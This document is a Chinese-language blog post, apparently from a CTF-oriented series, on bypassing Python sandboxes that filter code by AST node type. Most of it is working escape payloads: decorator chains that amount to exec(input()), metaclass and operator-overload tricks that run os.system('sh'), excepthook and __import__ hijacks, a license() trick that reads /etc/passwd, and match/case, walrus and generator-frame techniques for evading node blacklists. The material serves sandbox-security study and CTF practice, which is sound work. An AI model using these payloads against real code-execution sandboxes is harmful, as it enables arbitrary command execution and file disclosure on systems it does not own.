---
title: pyjail bypass-08 绕过 AST 沙箱
date: 2023-05-30 10:23:57
categories:
- Python
tags:
- pyjail
mermaid: true
image:
  path: /assets/images/pyjail.jpg
toc: true
---

> - [pyjail 沙箱逃逸原理](/posts/python-沙箱逃逸原理/)
> - [绕过删除模块或方法](/posts/pyjail-bypass-01-绕过删除模块或方法/)
- [绕过基于字符串匹配的过滤](/posts/pyjail-bypass-02-字符串变换绕过/)
- [绕过命名空间限制](/posts/pyjail-bypass-03-绕过命名空间限制/)
- [绕过长度限制](/posts/pyjail-bypass-04-绕过多行限制/)
- [绕过多行限制](/posts/pyjail-bypass-05-绕过长度限制/)
- [变量覆盖与函数篡改](/posts/pyjail-bypass-06-变量覆盖与函数篡改/)
- [绕过 audit hook](/posts/pyjail-bypass-07-绕过-audit-hook/)
- [绕过 AST 沙箱](/posts/pyjail-bypass-08-绕过-AST-沙箱/)
- [绕过输出限制](/posts/pyjail-bypass-09-绕过输出限制/)
- [绕过 opcode 沙箱](/posts/pyjail-bypass-10-绕过-opcode-沙箱/)
- [利用生成器栈](/posts/pyjail-bypass-11-利用生成器栈/)


## 绕过 AST 沙箱
AST 沙箱会将用户的输入转化为操作码,此时字符串层面的变换基本上没用了,一般情况下考虑绕过 AST 黑名单. 例如下面的沙箱禁止了 ast.Import|ast.ImportFrom|ast.Call 这三类操作, 这样一来就无法导入模块和执行函数.

```py
import ast
import sys
import os

def verify_secure(m):
  for x in ast.walk(m):
    match type(x):
      case (ast.Import|ast.ImportFrom|ast.Call):
        print(f"ERROR: Banned statement {x}")
        return False
  return True

abspath = os.path.abspath(__file__)
dname = os.path.dirname(abspath)
os.chdir(dname)

print("-- Please enter code (last line must contain only --END)")
source_code = ""
while True:
  line = sys.stdin.readline()
  if line.startswith("--END"):
    break
  source_code += line

tree = compile(source_code, "input.py", 'exec', flags=ast.PyCF_ONLY_AST)
if verify_secure(tree):  # Safe to execute!
  print("-- Executing safe code:")
  compiled = compile(source_code, "input.py", 'exec')
  exec(compiled)
```
下面的 without call 来源于 hacktricks
### without call
如果基于 AST 的沙箱限制了执行函数,那么就需要找到一种不需要执行函数的方式执行系统命令.
#### 装饰器
利用 payload 如下，乍一看可能有些迷惑，但该 payload 实际上等效于 exec(input(X))
```py
@exec
@input
class X:
    pass
```
当我们输入上述的代码后, Python 会打开输入,此时我们再输入 payload 就可以成功执行命令.
```python
>>> @exec
... @input
... class X:
...     pass
... 
<class '__main__.X'>__import__("os").system("ls")
```
由于装饰器不会被解析为调用表达式或语句, 因此可以绕过黑名单, 最终传入的 payload 是由 input 接收的, 因此也不会被拦截.

其实这样的话,构造其实可以有很多,比如使用单层的装饰器，打开 help 函数.
```py
@help
class X:
    pass
```
这样可以直接进入帮助文档:
```py
Help on class X in module __main__:

class X(builtins.object)
 |  Data descriptors defined here:
 |  
 |  __dict__
 |      dictionary for instance variables (if defined)
 |  
 |  __weakref__
 |      list of weak references to the object (if defined)
(END)
```
再次输入 !sh 即可打开 /bin/sh

或是给装饰器加一些参数。
```py
import os

def fake_wrapper(f):
  return '/bin/sh'

@getattr(os,"system")
@fake_wrapper
def something():
  pass
```
相当于：
```bash
getattr(os,"system")(fake_wrapper(something))
```

亦或者自定义一个装饰器：
```py
import os

def fake_wrapper(f):
  return '/bin/sh'

@os.system
@fake_wrapper
def something():
  pass
```
相当于 os.system(fake_wrapper(something))，也就是 os.system('/bin/sh')



#### 函数覆盖

我们知道在 Python 中获取一个的属性例如 `obj[argument]` 实际上是调用的 `obj.__getitem__` 方法.因此只需要覆盖其 `__getitem__` 方法, 即可在使用 `obj[argument]` 执行代码:
```py
>>> class A:
...     __getitem__ = exec
... 
>>> A()['__import__("os").system("ls")']
```

但是这里调用了 A 的构造函数, 因此 AST 中还是会出现 ast.Call. 如何在不执行构造函数的情况下获取类实例呢? 

##### metaclass 利用
Python 中提供了一种元类(metaclass)概念。元类是创建类的“类”。在 Python中，类本身也是对象，元类就是创建这些类（即类的对象）的类。

元类在 Python 中的作用主要是用来创建类。类是对象的模板，而元类则是类的模板。元类定义了类的行为和属性，就像类定义了对象的行为和属性一样。

下面是基于元类的 payload, 在不使用构造函数的情况下触发
```py
class Metaclass(type):
    __getitem__ = exec 
    
class Sub(metaclass=Metaclass):
    pass

Sub['import os; os.system("sh")']
```

除了 `__getitem__` 之外其他方法的利用方式如下:

```py
__sub__ (k - 'import os; os.system("sh")')
__mul__ (k * 'import os; os.system("sh")')
__floordiv__ (k // 'import os; os.system("sh")')
__truediv__ (k / 'import os; os.system("sh")')
__mod__ (k % 'import os; os.system("sh")')
__pow__ (k**'import os; os.system("sh")')
__lt__ (k < 'import os; os.system("sh")')
__le__ (k <= 'import os; os.system("sh")')
__eq__ (k == 'import os; os.system("sh")')
__ne__ (k != 'import os; os.system("sh")')
__ge__ (k >= 'import os; os.system("sh")')
__gt__ (k > 'import os; os.system("sh")')
__iadd__ (k += 'import os; os.system("sh")')
__isub__ (k -= 'import os; os.system("sh")')
__imul__ (k *= 'import os; os.system("sh")')
__ifloordiv__ (k //= 'import os; os.system("sh")')
__idiv__ (k /= 'import os; os.system("sh")')
__itruediv__ (k /= 'import os; os.system("sh")') (Note that this only works when from __future__ import division is in effect.)
__imod__ (k %= 'import os; os.system("sh")')
__ipow__ (k **= 'import os; os.system("sh")')
__ilshift__ (k<<= 'import os; os.system("sh")')
__irshift__ (k >>= 'import os; os.system("sh")')
__iand__ (k = 'import os; os.system("sh")')
__ior__ (k |= 'import os; os.system("sh")')
__ixor__ (k ^= 'import os; os.system("sh")')
```
示例:
```py
class Metaclass(type):
    __sub__ = exec
    
class Sub(metaclass=Metaclass):
    pass

Sub-'import os; os.system("sh")'
```
##### exceptions 利用
利用 exceptions 的目的也是为了绕过显示地实例化一个类, 如果一个类继承了 Exception 类, 那么就可以通过 raise 关键字来实例化. payload 如下:
```py
class RCE(Exception):
    def __init__(self):
        self += 'import os; os.system("sh")'
    __iadd__ = exec 
    
raise RCE 
```
raise 会进入 RCE 的 `__init__`, 然后触发 `__iadd__` 也就是 exec.

当然, 触发异常不一定需要 raise, 主动地编写错误代码也可以触发,与是就有了如下的几种 payload.
```py
class X:
    def __init__(self, a, b, c):
        self += "os.system('sh')"
    __iadd__ = exec
sys.excepthook = X
1/0
```
这个 payload 中直接将 sys.excepthook 进行覆盖,任何异常产生时都会触发.

```py
class X():
  def __init__(self, a, b, c, d, e):
    self += "print(open('flag').read())"
  __iadd__ = eval
__builtins__.__import__ = X
{}[1337]
```
这个 payload 将 `__import__` 函数进行覆盖, 最后的 {}[1337] 在正常情况下会引发 KeyError 异常，因为 Python 在引发异常时会尝试导入某些模块（比如traceback 模块），导入时就会触发 `__import__`.


#### 通过 license 函数读取文件

```py
__builtins__.__dict__["license"]._Printer__filenames=["/etc/passwd"]
a = __builtins__.help
a.__class__.__enter__ = __builtins__.__dict__["license"]
a.__class__.__exit__ = lambda self, *args: None
with (a as b):
    pass
```
上面的 payload 修改内建函数 license 的文件名列表为 /etc/passwd 当调用 `license()` 时会打印这个文件的内容.
```py
>>> __builtins__.__dict__["license"]._Printer__filenames
['/usr/lib/python3.11/../LICENSE.txt', '/usr/lib/python3.11/../LICENSE', '/usr/lib/python3.11/LICENSE.txt', '/usr/lib/python3.11/LICENSE', './LICENSE.txt', './LICENSE']
```
payload 中将 help 类的 `__enter__` 方法覆盖为 `license` 方法, 而 with 语句在创建上下文时会调用 help 的`__enter__`, 从而执行 `license` 方法. 这里的 help 类只是一个载体, 替换为其他的支持上下文的类或者自定义一个类也是可以的. 例如:
```py
class MyContext:
    pass
    
__builtins__.__dict__["license"]._Printer__filenames=["/etc/passwd"]
a = MyContext()
a.__class__.__enter__ = __builtins__.__dict__["license"]
a.__class__.__exit__ = lambda self, *args: None
with (a as b):
    pass
```

### 打印 AST
```py
import os
import ast 

BAD_ATS = {
  ast.Attribute,
  ast.AST,
  ast.Subscript,
  ast.comprehension,
  ast.Delete,
  ast.Try,
  ast.For,
  ast.ExceptHandler,
  ast.With,
  ast.Import,
  ast.ImportFrom,
  ast.Assign,
  ast.AnnAssign,
  ast.Constant,
  ast.ClassDef,
  ast.AsyncFunctionDef,
}

a = '''
[
    system:=111,
    bash:=222
]
'''
print(ast.dump(ast.parse(a, mode='exec'), indent=4))


for x in ast.walk(compile(a, "<QWB7th>", "exec", flags=ast.PyCF_ONLY_AST)):
  if type(x) in BAD_ATS:
    print(type(x))
    exit()

print("[+] OK")
```

### 绕过 ast.Attribute 获取属性
如何绕过 ast.Attribute？python 3.10 中引入了一个新的特性：match/case，类似其他语言中的 switch/case，但 match/case 更加强大，除了可以匹配数字字符串之外，还可以匹配字典、对象等。

最简单的示例，匹配字符串：
```py
item = 2

match item:
    case 1:
        print("One")
    case 2:
        print("Two")

# Two
```
还可以匹配并自动赋值给局部变量，传入 (1,2) 时，会进入第二个分支，并对 x,y 赋值。
```py
item = (1, 2)

match item:
    case (x, y, z):
        print(f"{x} {y} {z}")
    case (x, y):
        print(f"{x} {y}")
    case (x,):
        print(f"{x}")
```
对于基本类型的匹配比较好理解，下面是一个匹配类的示例：
```py
class AClass:
    def __init__(self, value):
        self.thing = value

item = AClass(32)

match item:
    case AClass(thing=x):
        print(f"Got {x = }!")

# Got x = 32!
```
在这个示例中，重点关注`case AClass(thing=x)`，这里的含义并非是将 x 赋值给 thing，我们需要将其理解为一个表达式，表示匹配类型为 AClass 且存在 thing 属性的对象，并且 thing 属性值自动赋值给 x。

这样一来就可以在不适用 . 号的情况下获取到类的属性值。例如获取 `''.__class__`，可以编写如下的 match/case 语句：
```py
match str():
    case str(__class__=x):
        print(x==''.__class__)

# True
```
可以看到 x 就是 `''.__class__`. 因为所有的类都输入 object 类，所以可以使用 object 来替代 str，这样就无需关注匹配到的到底是哪个类。
```py
match str():
    case object(__class__=x):
        print(x==''.__class__)

# True
```


再测试一下该 payload 的 AST：
```py
import os
import ast 

a = '''
match str():
    case str(__class__=x):
        print(x)
'''
print(ast.dump(ast.parse(a, mode='exec'), indent=4))
```
AST 如下：
```py
Module(
    body=[
        Match(
            subject=Call(
                func=Name(id='str', ctx=Load()),
                args=[],
                keywords=[]),
            cases=[
                match_case(
                    pattern=MatchClass(
                        cls=Name(id='str', ctx=Load()),
                        patterns=[],
                        kwd_attrs=[
                            '__class__'],
                        kwd_patterns=[
                            MatchAs(name='x')]),
                    body=[
                        Expr(
                            value=Call(
                                func=Name(id='print', ctx=Load()),
                                args=[
                                    Name(id='x', ctx=Load())],
                                keywords=[]))])])],
    type_ignores=[])
```
可以看到确实没有 Attribute，依据这个原理，就可以绕过 ast.Attribute

我们可以构造替代 `''.__class__.__base__.__subclasses__()`的 payload：
```py
match str():
    case object(__class__=clazz):
        match clazz:
            case object(__base__=bass):
                match bass:
                    case object(__subclasses__=subclazz):
                        print(subclazz)
```
### 绕过 ast.Assign 赋值变量
ast.Assign 无法使用时，我们无法直接使用 = 来进行赋值，此时可以使用海象表达式进行绕过。例如：
```py
[
    system:=111,
    bash:=222
]
```
此时 AST 树如下,海象表达式用到的是 ast.NamedExpr 而非 ast.Assign
```py
Module(
    body=[
        Expr(
            value=List(
                elts=[
                    NamedExpr(
                        target=Name(id='system', ctx=Store()),
                        value=Constant(value=111)),
                    NamedExpr(
                        target=Name(id='bash', ctx=Store()),
                        value=Constant(value=222))],
                ctx=Load()))],
    type_ignores=[])
```

### 绕过 ast.Constant 获取数字、字符串
题目限制了 ast.Constant，所以无法直接使用数字、字符串常量，但通过其他的函数组合可以构造出数字和字符串。
例如：
```py
"" : str()
0  : len([])
"0": str(len([]))
"1": str(len([str()])) 或 str(len([min]))
"2": str(len([str(),str()])) 或 str(len([min,max]))
'A': chr(len([min,min,min,min,min])*len([min,min,min,min,min,min,min,min,min,min,min,min,min]))
```
如果要用数字来构造字符串，通常需要用到 chr 函数，虽然题目的 builtins 没有直接提供 chr 函数，但也可以自己手动实现一个 chr。

当然，题目 builtins 允许 dict 和 list，因此可以直接用这两个函数直接构造出字符串，这种方式在我此前的博客：[pyjail bypass-02 绕过基于字符串匹配的过滤](https://dummykitty.github.io/python/2023/05/30/pyjail-bypass-02-%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8F%98%E6%8D%A2%E7%BB%95%E8%BF%87.html#list--dict) 中有提到过。

在这个 payload 中，需要构造出 _wrap_close、system、bash
```py
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__=="_wrap_close"][0]["system"]("bash")
```
那么就可以通过下面的方式获取到这几个字符串：
```bash
list(dict(system=[]))[0]            # system
list(dict(_wrap_close=[]))[0]       # _wrap_close
list(dict(bash=[]))[0]              # bash
```

### 绕过 ast.Subscript 获取列表/字典元素
题目同时限定了 ast.Subscript，因此无法直接使用索引。但 BUILTINS 中给出了 min 函数，该函数可以获取列表中最小的元素，当列表中只有一个元素时，就可以直接取值。
```py
min(list(dict(system=[])))            # system
min(list(dict(_wrap_close=[])))       # _wrap_close
min(list(dict(bash=[])))              # bash
```

如果要获取字典元素，可以利用 get 函数来替代 Subscript。例如我需要在 globals 字典中获取 key 为 system 的元素，可以配合 match/case 来获取。
```py
match globals:
    case object(get=get_func):
        get_func("system")
```

### 绕过 ast.For 遍历列表
在构造最终 payload 中，我们还需要在 `__subclasses__()`得到的列表中获取到 _wrap_close 类。
```py
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__=="_wrap_close"][0]["system"]("bash")
```
当列表中不只有一个元素且列表中的元素之间无法比较时，正常情况下可以使用 for 来遍历并判断，但 ast.For 被题目过滤了，此时可以使用 filter，如下所示：
```py
def filter_func(subclazzes_item):
    [ _wrap_close:=min(list(dict(_wrap_close=[])))]
    match subclazzes_item:
        case object(_＿name_＿=name):
            if name==_wrap_close:
                return subclazzes_item
[
    subclazzes_item:=min(filter(filter_func,subclazzes()))
]
```
fitler 中使用 match/case 和 if 来进行过滤。

除了使用 filter 函数外，还可以使用 iter 和 next 函数来遍历列表，但题目 BUILTINS 中没有给出这两个函数。

### 绕过 ast.GeneratorExp 获取生成器栈帧
思路来自于 [[DiceCTF 2024] IRS](https://maplebacon.org/2024/02/dicectf2024-irs/) 

payload 如下，且 AST 中不会出现 ast.GeneratorExp。
```py
def f():
    global x, frame
    frame = x.gi_frame.f_back.f_back
    yield
x = f()
x.send(None)
print(frame)
```
如何理解这段代码：
1. 首先声明了一个生成器 f，
   1. f 内部声明了全局变量 x 和 frame，意味着会在函数外部对其进行操作。
2. x = f() 会实例化一个生成器，但由于生成器的延迟加载，此时生成器不会执行。
3. x.send(None)：这行代码启动了生成器，并让它执行到第一个 yield 语句。

测试代码如下：
```py
import ast

flag = "flag{12345}"
code = '''
def f():
    global x, frame
    frame = x.gi_frame.f_back.f_back
    yield
x = f()
x.send(None)
print(frame.f_globals)
'''

print(ast.dump(ast.parse(code, mode='exec'), indent=4))
root = ast.parse(code)
compiled_code = compile(code,"<sandbox>", "exec")
# 又是一段严防死守的过滤
exec(
    compiled_code,
    None,   # globals，也可能是其他值
    None    # locals，也可能是其他值
)
```


## 参考资料
- [Python沙箱逃逸小结](https://www.mi1k7ea.com/2019/05/31/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%B0%8F%E7%BB%93/#%E8%BF%87%E6%BB%A4-globals)
- [Python 沙箱逃逸的经验总结](https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/#%E5%89%8D%E8%A8%80)
- [Python 沙箱逃逸的通解探索之路](https://www.tr0y.wang/2022/09/28/common-exp-of-python-jail/)
- [python沙箱逃逸学习记录](https://xz.aliyun.com/t/12303#toc-11)
- [Bypass Python sandboxes](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes)
- [[PyJail] python沙箱逃逸探究·上（HNCTF题解 - WEEK1）](https://zhuanlan.zhihu.com/p/578986988)
- [[PyJail] python沙箱逃逸探究·中（HNCTF题解 - WEEK2）](https://zhuanlan.zhihu.com/p/579057932)
- [[PyJail] python沙箱逃逸探究·下（HNCTF题解 - WEEK3）](https://zhuanlan.zhihu.com/p/579183067)
- [audited2](https://ctftime.org/writeup/31883)
- [【ctf】HNCTF Jail All In One](https://www.woodwhale.top/archives/hnctfj-ail-all-in-one)
- [HAXLAB — Endgame Pwn](https://ctftime.org/writeup/28286)
- [Python沙箱逃逸的n种姿势](https://ctftime.org/writeup/28286)
- [hxp2020-audited](https://pullp.github.io/writeup/2020/12/26/hxp2020-audited.html)
- [[GoogleCTF2022] TREEBOX Writeup](https://domdom.tistory.com/entry/GoogleCTF2022-TREEBOX-Writeup%EB%AC%B8%EC%A0%9C%ED%92%80%EC%9D%B4)
- [Google CTF 2022 文章 #CTF - Qiita](https://qiita.com/kusano_k/items/3d90a59b6d048497e3c7#treebox)
- [13. Structural Pattern Matching (Python 3.10+) — Level Up Your Python](https://henryiii.github.io/level-up-your-python/notebooks/2.8%20Pattern%20Matching.html)